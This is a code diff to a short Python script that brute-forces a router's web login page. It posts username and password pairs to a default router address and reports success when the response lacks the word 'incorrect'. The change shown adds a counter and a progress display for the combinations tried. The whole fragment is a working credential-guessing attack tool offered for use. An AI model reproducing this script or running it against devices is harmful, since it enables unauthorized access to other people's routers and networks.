@@ -5,15 +5,19 @@ url = "http://192.168.1.1"  # Check address.md for routers' default IP address.
 
 expression = b"incorrect"  # changed to bytes-like object.
 
-def brute(username, password):
+def brute(username, password, combinations_tested):
     data = {'username': username, 'password': password}
     r = requests.post(url, data=data)
     #print("Server response: ", r.content)  # (optional) print server response
+    combinations_tested += 1
+    sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
+    sys.stdout.flush()
     if expression not in r.content:
         print("Brute Forcing...")
         print("[+] Username: ", username)
         print("[+] Password: ", password)
         sys.exit()
+    return combinations_tested # add quantity of combinations
 
 
 def main():
